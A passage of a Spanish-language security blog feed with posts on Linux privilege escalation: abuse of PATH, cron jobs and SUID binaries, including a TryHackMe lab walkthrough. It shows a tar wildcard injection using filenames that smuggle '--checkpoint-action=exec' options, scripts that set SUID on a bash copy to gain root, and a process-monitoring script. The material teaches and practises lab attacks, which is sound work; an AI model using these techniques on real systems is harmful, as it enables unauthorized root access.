+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/C73Ts28/6.png&quot; alt=&quot;export PATH - new&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora llego la hora de la acción, si ejecutamos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;suid-env&lt;/code&gt; podemos ver que en vez de arrancar el servicio apache, nos asignó el permiso SUID a la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/pz16rD0/7.png&quot; alt=&quot;/bin/bash&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;y así de fácil es como escalamos privilegios:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/DWvVgX9/8.png&quot; alt=&quot;whoami&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;</content><author><name>Jose Salinas</name></author><category term="PrivEsc" /><category term="linux" /><category term="privesc" /><category term="path" /><summary type="html">En los sistemas operativos hay un concepto llamado las variables de entorno, quizás algunos ya hayamos usado estos sin darnos cuenta, ya sea %AppData% para encontrar el directorio donde poner los mods de Minecraft o %Temp% para borrar los archivos temporales (si eres de Microsoft).</summary></entry><entry><title type="html">Explotación de tareas Cron</title><link href="http://localhost:4000/privesc/explotacion-de-tareas-cron/" rel="alternate" type="text/html" title="Explotación de tareas Cron" /><published>2021-12-13T00:00:00+00:00</published><updated>2021-12-13T00:00:00+00:00</updated><id>http://localhost:4000/privesc/explotacion-de-tareas-cron</id><content type="html" xml:base="http://localhost:4000/privesc/explotacion-de-tareas-cron/">&lt;p&gt;A menudo hay formas de hacer las cosas de manera más rápida, como por ejemplo, las tareas. Algunos webmasters en vez de hacerlo manualmente prefieren ahorrarse el tiempo y automatizarlas. Esto en parte está bien, ya que no siempre vamos a poder estar presentes para ejecutar algo, pero a veces por culpa de una mala configuración esto puede salir muy mal.&lt;/p&gt;
+
+&lt;h2 id=&quot;cron&quot;&gt;Cron&lt;/h2&gt;
+
+&lt;p&gt;En los sistemas operativos Unix, cron es un demonio (proceso en segundo plano) que se ejecuta cuando alguien arranca el sistema operativo. Este se encargará de comprobar de acuerdo al tiempo especificado, si existe alguna tarea para ser ejecutada.&lt;/p&gt;
+
+&lt;h2 id=&quot;crontab&quot;&gt;Crontab&lt;/h2&gt;
+
+&lt;p&gt;El crontab es un archivo donde se guardara una lista de comandos a ser ejecutada en un tiempo especificado por el usuario.&lt;/p&gt;
+
+&lt;h2 id=&quot;diferencias-entre-cron-y-crontab&quot;&gt;Diferencias entre Cron y Crontab&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;crontab&lt;/strong&gt; sería el archivo donde se escribirán la lista de comandos o scripts a ser ejecutadas en un determinado tiempo, estará específicamente diseñado para que sea leído correctamente por &lt;strong&gt;cron&lt;/strong&gt; y proceder con la ejecución que nosotros hayamos programado.&lt;/p&gt;
+
+&lt;h2 id=&quot;cómo-se-usa&quot;&gt;¿Cómo se usa?&lt;/h2&gt;
+
+&lt;p&gt;Para poner a funcionar una tarea en cron debemos crear un archivo crontab, pero primero debemos saber como es su sintaxis.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/ZTVqLb1/crontab-2.png&quot; alt=&quot;/etc/crontab&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Eso del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;user-name&amp;gt;&lt;/code&gt; no necesario, porque puedes crear un archivo crontab para cada usuario como root, con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crontab -u &amp;lt;username&amp;gt; -e &amp;lt;username&amp;gt;&lt;/code&gt; donde el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-u&lt;/code&gt; es para especificar el usuario y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt; para crear/editar las tareas a ejecutar del usuario.&lt;/p&gt;
+
+&lt;p&gt;Ejemplo: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*/1 * * * * touch /home/user/temp/$(date | cut -d &apos; &apos; -f 5)&lt;/code&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*/1&lt;/code&gt; : Minuto&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; : Hora&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; : Día del mes&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; : Mes&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; : Día de la semana&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;touch /home/user/temp/$(date | cut -d &apos; &apos; -f 5)&lt;/code&gt; : Comando o Script&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Las instrucciones que le estamos dando en este ejemplo son bastante simples. Le estamos diciendo que nos cree un archivo que contenga de nombre la hora exacta del momento en el que lo creo. Así es como funcionaria:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/hRCmb5t/crontab-1.png&quot; alt=&quot;Ejemplo de un archivo crontab&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Recurso para entender como funcionan las expresiones de programación &lt;strong&gt;crontab&lt;/strong&gt;: &lt;a href=&quot;https://crontab.guru&quot; target=&quot;_blank&quot;&gt;crontab.guru&lt;/a&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;cuál-es-el-riesgo-de-las-tareas-cron&quot;&gt;¿Cuál es el riesgo de las tareas Cron?&lt;/h2&gt;
+
+&lt;p&gt;En realidad no debería existir riesgo, pero lamentablemente si hacemos una mala programación de este, sí que lo hay. Por ejemplo, supongamos que te has creado un script en bash para hacer backups de tu sitio web y has programado a cron para que lo ejecute cada 24 horas:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;backup_files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home /root /var/www/html&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;day&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; +%A&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;archive_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$hostname&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$day&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.tgz&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;czf /mnt/backup/&lt;span class=&quot;nv&quot;&gt;$archive_file&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$backup_files&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si analizamos el script no tiene nada raro, pero si le hacemos un listado largo al script (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -l&lt;/code&gt;) nos muestra los siguientes permisos: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-rwx-w--w-&lt;/code&gt;. Solo tenemos el permiso de escritura… yo sabiendo esto ya se me ocurre un vector de ataque, consiste en agregarle &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod u+s /usr/bin/bash&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt; para que en el momento que cron ejecute el script como usuario root, agregue el permiso SUID a la bash.&lt;/p&gt;
+
+&lt;h2 id=&quot;detección-de-tareas-cron-a-través-de-un-script-en-bash&quot;&gt;Detección de tareas Cron a través de un script en Bash&lt;/h2&gt;
+
+&lt;p&gt;Este script hecho en bash sirve para ver tareas/procesos nuevos que están siendo ejecutados en tiempo real.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;old_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-eo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+	&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;new_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-eo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+	diff &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$old_process&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$new_process&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;gt;\&amp;lt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;]&quot;&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;old_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$new_process&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;El uso y funcionamiento de este script es muy sencillo, lo que hace sería ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps -eo command&lt;/code&gt; y almacenarlo en la variable old_process, luego entra en un bucle infinito donde ejecuta el mismo comando y lo almacena en una nueva variable llamada new_process, porque entre estas dos variables hay diferentes salidas, a pesar de que en las dos ejecutaran el mismo comando aún existe el delay de tiempo del momento en que fueron ejecutadas. Esto nos lleva a comparar las salidas de las dos variables con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;diff&lt;/code&gt; y que imprima las diferencias. Antes de repetir el mismo bucle varias veces debemos renovar el contenido de la variable old_process por la de new_process del momento.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Una alternativa también seria &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot; target=&quot;_blank&quot;&gt;PsPy&lt;/a&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;privesc--cron&quot;&gt;PrivEsc / Cron&lt;/h2&gt;
+
+&lt;p&gt;Para demostrar que tan critico es esto, voy a hacer una tarea del módulo &lt;a href=&quot;https://tryhackme.com/room/linuxprivesc&quot; target=&quot;_blank&quot;&gt;Linux PrivEsc&lt;/a&gt; de la plataforma &lt;a href=&quot;https://tryhackme.com&quot; target=&quot;_blank&quot;&gt;TryHackMe&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;cron-jobs---wildcard&quot;&gt;Cron Jobs - Wildcard&lt;/h3&gt;
+
+&lt;p&gt;Para empezar primero debemos saber que &lt;strong&gt;cron jobs&lt;/strong&gt; están corriendo ahora mismo en la máquina, y para detectarlos podemos usar el script ya explicado anteriormente “procmon.sh” (o también puedes usar PsPy). Yo lo crearé y guardaré en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;procmon.sh&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Ya guardado debemos asegurarnos si el script tiene permiso de ejecución (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +x /tmp/procmon.sh&lt;/code&gt;).&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;si corremos el script podemos detectar lo siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/wwksFyq/2.png&quot; alt=&quot;&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;vemos que se está ejecutando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh /usr/local/bin/compress.sh&lt;/code&gt;, listaremos su contenido:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/user
+&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;czf /tmp/backup.tar.gz &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;lo primero que hace es entrar al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;home&lt;/code&gt; de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; y con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar&lt;/code&gt; indicando los parámetros &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;czf&lt;/code&gt; selecciona todos los archivos (*) y los mete en un comprimido llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup.tar.gz&lt;/code&gt; ubicado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Aquí nos podemos dar cuenta de algo muy crítico. El comodín (*) que se expande para incluir todos los archivos del directorio especificado. Si vemos la ayuda de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar&lt;/code&gt; podemos ver unos dos parámetros interesantes:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--checkpoint[=NUMBER]&lt;/code&gt; display progress messages every NUMBERth record (default 10)&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--checkpoint-action=ACTION&lt;/code&gt; execute ACTION on each checkpoint&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Sabiendo esto nos podemos plantear la siguiente pregunta: ¿y qué tal si en vez de comprimir más archivos mejor le asignamos unos parámetros?. Dado que a los nombres de los archivos los puede interpretar como opciones de parámetros válidos, crearemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--checkpoint=1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--checkpoint-action=exec=a.sh&lt;/code&gt; y un script con el nombre asignado anteriormente (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a.sh&lt;/code&gt;) donde copiaremos la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; y le asignaremos el permiso &lt;strong&gt;SUID&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; ./--checkpoint&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 ./--checkpoint-action&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;a.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;cp /bin/bash /tmp &amp;amp;&amp;amp; chmod u+s /tmp/bash&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ./a.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x ./a.sh
+user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;a.sh &lt;span class=&quot;nt&quot;&gt;--checkpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nt&quot;&gt;--checkpoint-action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;a.sh myvpn.ovpn tools
+user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./a.sh
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/bash /tmp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;u+s /tmp/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora si nos ponemos en escucha con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;watch -n 1 ls -l /tmp/bash&lt;/code&gt; y si esperamos un rato, veremos que funciona. Solo nos quedaría ejecutar bash como su propietario con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; y nos convertiremos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/HCkH5b5/15.png&quot; alt=&quot;&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;</content><author><name>Jose Salinas</name></author><category term="PrivEsc" /><category term="linux" /><category term="privesc" /><category term="cron" /><summary type="html">A menudo hay formas de hacer las cosas de manera más rápida, como por ejemplo, las tareas. Algunos webmasters en vez de hacerlo manualmente prefieren ahorrarse el tiempo y automatizarlas. Esto en parte está bien, ya que no siempre vamos a poder estar presentes para ejecutar algo, pero a veces por culpa de una mala configuración esto puede salir muy mal.</summary></entry><entry><title type="html">Explotación de permisos SUID</title><link href="http://localhost:4000/privesc/explotacion-de-permisos-suid/" rel="alternate" type="text/html" title="Explotación de permisos SUID" /><published>2021-12-09T00:00:00+00:00</published><updated>2021-12-09T00:00:00+00:00</updated><id>http://localhost:4000/privesc/explotacion-de-permisos-suid</id><content type="html" xml:base="http://localhost:4000/privesc/explotacion-de-permisos-suid/">&lt;p&gt;Hay veces que es necesario que un programa se ejecute con los privilegios de su propietario en lugar de con los privilegios del usuario que lo ejecuta.&lt;/p&gt;
+
+&lt;h2 id=&quot;permisos-suid&quot;&gt;Permisos SUID&lt;/h2&gt;
+
+&lt;p&gt;El bit de &lt;strong&gt;SUID/setuid&lt;/strong&gt; (Set User ID) se activa sobre un fichero añadiéndole &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4000&lt;/code&gt; a la representación octal de los permisos de un archivo y agregándole permisos de ejecución al propietario, al hacer esto en lugar de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt; aparecerá una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt; o una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;S&lt;/code&gt; si no hemos otorgado el permiso de ejecución correspondiente (en este caso el bit no tiene efecto):&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;4100 file
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/mtRxbD1/f-4100.png&quot; alt=&quot;SUID &amp;quot;s&amp;quot;&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;4000 file
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/y6HcLcj/f-4000.png&quot; alt=&quot;SUID &amp;quot;S&amp;quot;&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;El bit &lt;strong&gt;SUID&lt;/strong&gt; activado sobre un fichero indica que todo aquel que ejecute el archivo va a tener durante la ejecución los mismos privilegios que quién lo creó, por ejemplo: si el administrador crea un fichero y lo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_setuida_&lt;/code&gt;, todo aquel usuario que lo ejecute va a disponer de sus permisos hasta que el programa finalice.&lt;/p&gt;
+
+&lt;p&gt;Un ejemplo sería este código:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;UID: %d, EUID: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como usuario root lo compilamos y le agregamos permisos &lt;strong&gt;SUID&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cc &amp;lt;filename&amp;gt;.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; suid
+user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;u+s ./suid
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora nos convertiremos en un usuario normal y ejecutaremos el programa que hemos compilado, el resultado debería ser algo así:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@debian:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./sys
+
+UID: 1000, EUID: 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;UID&lt;/strong&gt;: Es el usuario original&lt;/p&gt;
+
+  &lt;p&gt;&lt;strong&gt;EUID&lt;/strong&gt;: Es el usuario al que cambiaste&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;gtfobins&quot;&gt;GTFOBINS&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBINS&lt;/a&gt; es una lista seleccionada de binarios de &lt;strong&gt;Unix&lt;/strong&gt; que se pueden utilizar para eludir las restricciones de seguridad locales en sistemas mal configurados. Mayormente, esta página se usa como fuente de información para escalar privilegios en los sistemas &lt;strong&gt;Linux&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a escoger un binario de sus listas e intentaremos escalaremos privilegios. En este caso para hacerlo muy sencillo escogeremos el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/Stb59sz/find-suid-0.png&quot; alt=&quot;Find - SUID&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Agregar el permiso SUID a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod u+s /usr/bin/find&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Leeremos y ejecutaremos lo que nos dice en el apartado de &lt;strong&gt;SUID&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.ibb.co/Ky20hgL/find-suid-1.png&quot; alt=&quot;Find - SUID&quot; class=&quot;acc&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;privesc--suid---find&quot;&gt;PrivEsc / SUID - find&lt;/h3&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;https://i.ibb.co/8mmp0Zk/find-suid-2.png&quot; alt=&quot;Find - SUID&quot; class=&quot;acc&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;explicación&quot;&gt;Explicación&lt;/h3&gt;
+
+&lt;p&gt;Solo es cuestión de analizar:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; tiene un parámetro que te permite ejecutar comandos a nivel de sistema.&lt;/li&gt;
